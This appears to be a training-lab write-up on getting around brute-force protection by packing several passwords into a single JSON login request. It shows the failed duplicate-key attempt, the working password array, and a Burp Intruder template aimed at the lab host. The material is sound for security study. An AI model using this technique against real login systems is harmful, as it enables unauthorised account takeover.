# Lab: Broken brute-force protection, multiple credentials per request
## Description

1. I first submitted a simple test login request and noticed that the POST request was JSON with an additional empty key/value pair (hmmm?)
```json
{ 
	"username": "carlos",
	"password": "test",
	"": ""
}
```
2. The Lab exercise already hinted at "multiple credentials per request". So I wrote a small script that would generate a payload set containing 3 passwords within every single JSON request (note this is technically an invalid JSON payload, and the `password` parameter would usually be overwritten but I felt it was worth a try anyway). Example:
```json
{
	"username": "carlos",
	"password": "mobilemail",
	"password": "mom",
	"password": "monitor"
}
```
3. I used the custom generated [payload set](07-generate-payloads.lst) with Burp Intruder. Intruder was configured using a single thread with a 1 min. delay per request to avoid lockout.
4. Waited.......only to realize it failed.
5. I rewrote the script and attempted adding a list of passwords instead such as this
```json
{
	"username": "carlos",
	"password": ["thunder", "taylor", "matrix", "mobilemail", "mom"]
}
```
Which worked. One of the requests returned 302 Found. Yey!

## Solution
1. Use [script](07-generate-payloads.py) to generate the [payload set](07-generate-payloads.lst)
2. Configure Burp Intruder to loop through the list of credentials, max. 1 request per minute:
```
POST /login HTTP/1.1
Host: ac021f411e0cdd91c0d98b1000d90066.web-security-academy.net
Content-Length: 184

§§
```